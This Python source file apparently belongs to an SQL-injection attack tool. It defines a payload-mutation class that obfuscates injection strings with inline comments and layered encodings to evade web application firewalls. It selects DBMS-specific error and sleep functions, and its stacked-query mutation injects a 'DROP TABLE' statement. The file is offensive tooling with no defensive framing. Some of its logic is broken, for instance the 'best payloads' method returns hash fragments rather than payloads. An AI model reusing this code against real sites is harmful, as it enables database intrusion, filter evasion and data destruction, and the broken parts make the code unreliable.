#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
GenSQL AI Payload Engine - Offline AI-driven payload mutation
Author: Jeevraj
Features:
  - Pattern-based payload generation
  - Adaptive learning from responses
  - DBMS-specific payload optimization
  - Encoding/obfuscation selection
"""

import re
import random
import hashlib
from collections import defaultdict, Counter

class AIPayloadEngine(object):
    """
    Offline AI payload mutation engine.
    Uses pattern matching and scoring to generate optimal payloads.
    """

    def __init__(self, offline=True, dbms=None, verbose=False):
        self.offline = offline
        self.dbms = dbms or "mysql"
        self.verbose = verbose
        self.learned_patterns = defaultdict(float)
        self.response_cache = {}
        self.payload_scores = {}
        self.mutation_count = 0

    def generate_payload(self, base_payload, technique="union", encoding="none"):
        """
        Generate optimized payload with mutations.
        
        Args:
            base_payload: Base SQL payload
            technique: Injection technique (union, error, blind, time, stacked)
            encoding: Encoding method (none, url, base64, hex, double)
        
        Returns:
            Mutated payload string
        """
        payload = base_payload
        
        # Apply technique-specific mutations
        if technique == "union":
            payload = self._mutate_union(payload)
        elif technique == "error":
            payload = self._mutate_error(payload)
        elif technique == "blind":
            payload = self._mutate_blind(payload)
        elif technique == "time":
            payload = self._mutate_time(payload)
        elif technique == "stacked":
            payload = self._mutate_stacked(payload)
        
        # Apply encoding
        payload = self._apply_encoding(payload, encoding)
        
        # Learn from payload patterns
        self._learn_pattern(base_payload, payload)
        self.mutation_count += 1
        
        return payload

    def _mutate_union(self, payload):
        """Mutate UNION-based payload"""
        mutations = [
            lambda p: p.replace(" UNION ", "/**/UNION/**/"),
            lambda p: p.replace(" SELECT ", "/**/SELECT/**/"),
            lambda p: re.sub(r'(\d+),(\d+)', lambda m: f"{m.group(1)}/**/,/**/" + m.group(2), p),
            lambda p: p.replace("'", "\\'") if "'" in p else p,
            lambda p: p.replace(",", "/**/,/**/ "),
        ]
        return random.choice(mutations)(payload)

    def _mutate_error(self, payload):
        """Mutate error-based payload"""
        # DBMS-specific error triggers
        dbms_tricks = {
            "mysql": ["EXTRACTVALUE", "UPDATEXML", "floor(rand())"],
            "mssql": ["CONVERT", "CAST", "@@version"],
            "postgres": ["CAST", "pg_sleep", "generate_series"],
            "oracle": ["DBMS_UTILITY", "UTL_INADDR", "CHAR(67)\\x2b\\x3b"],
        }
        tricks = dbms_tricks.get(self.dbms.lower(), [])
        if tricks:
            payload = payload.replace("error", random.choice(tricks))
        return payload

    def _mutate_blind(self, payload):
        """Mutate blind-based payload with binary search optimizations"""
        # Optimize for binary search (log₂ vs sequential)
        if "LIKE" in payload or "SUBSTRING" in payload:
            payload = payload.replace("LIKE", "REGEXP")
        if "OR" in payload:
            payload = payload.replace(" OR ", " AND ")
        return payload

    def _mutate_time(self, payload):
        """Mutate time-based payload"""
        dbms_sleep = {
            "mysql": "SLEEP({})",
            "mssql": "WAITFOR DELAY '00:00:{}'",
            "postgres": "pg_sleep({})",
            "oracle": "DBMS_LOCK.SLEEP({})",
            "sqlite": "SELECT COUNT(*) FROM sqlite_master WHERE tbl_name LIKE 'sqlite_master' LIMIT {}",
        }
        sleep_func = dbms_sleep.get(self.dbms.lower(), "SLEEP({})")
        delay = random.randint(1, 5)
        return payload.replace("[DELAY]", sleep_func.format(delay))

    def _mutate_stacked(self, payload):
        """Mutate stacked query payload"""
        # Use semicolon separation or comment tricks
        if ";" in payload:
            payload = payload.replace(";", "; DROP TABLE IF EXISTS x; --")
        return payload

    def _apply_encoding(self, payload, encoding):
        """Apply encoding transformations to payload"""
        if encoding == "none":
            return payload
        elif encoding == "url":
            import urllib.parse
            return urllib.parse.quote(payload)
        elif encoding == "base64":
            import base64
            return base64.b64encode(payload.encode()).decode()
        elif encoding == "hex":
            return "0x" + payload.encode().hex()
        elif encoding == "double":
            import urllib.parse
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == "unicode":
            return "".join(f"%u{ord(c):04x}" for c in payload)
        return payload

    def _learn_pattern(self, base, mutated):
        """Learn successful patterns from mutations"""
        pattern_hash = hashlib.md5(mutated.encode()).hexdigest()[:8]
        if pattern_hash not in self.learned_patterns:
            self.learned_patterns[pattern_hash] = 0.0
        self.learned_patterns[pattern_hash] += 1.0

    def score_payload(self, payload, response_indicators=None):
        """
        Score payload effectiveness based on patterns.
        
        Args:
            payload: Payload to score
            response_indicators: List of success indicators in response
        
        Returns:
            Score 0-1.0
        """
        score = 0.5  # baseline
        
        # Reward shorter payloads (evasion)
        if len(payload) < 50:
            score += 0.1
        
        # Reward payloads without common WAF triggers
        waf_triggers = ["union", "select", "drop", "insert", "delete"]
        trigger_count = sum(1 for t in waf_triggers if t.lower() in payload.lower())
        score -= trigger_count * 0.05
        
        # Reward known successful patterns
        pattern_hash = hashlib.md5(payload.encode()).hexdigest()[:8]
        if pattern_hash in self.learned_patterns:
            score += self.learned_patterns[pattern_hash] * 0.01
        
        return min(1.0, max(0.0, score))

    def get_best_payloads(self, count=5):
        """
        Get top-scoring payloads.
        
        Returns:
            List of (payload, score) tuples
        """
        sorted_patterns = sorted(
            self.learned_patterns.items(),
            key=lambda x: x[1],
            reverse=True
        )
        return sorted_patterns[:count]

    def adapt_to_response(self, payload, response_text):
        """
        Analyze response and adapt future payloads.
        
        Args:
            payload: Sent payload
            response_text: Response body
        """
        # Simple response analysis
        if len(response_text) > 100:
            self.response_cache[payload] = "verbose"
        if "error" in response_text.lower():
            self.response_cache[payload] = "error_based"
        if "timeout" in response_text.lower():
            self.response_cache[payload] = "time_based"

    def reset(self):
        """Reset learned patterns"""
        self.learned_patterns.clear()
        self.response_cache.clear()
        self.payload_scores.clear()
        self.mutation_count = 0
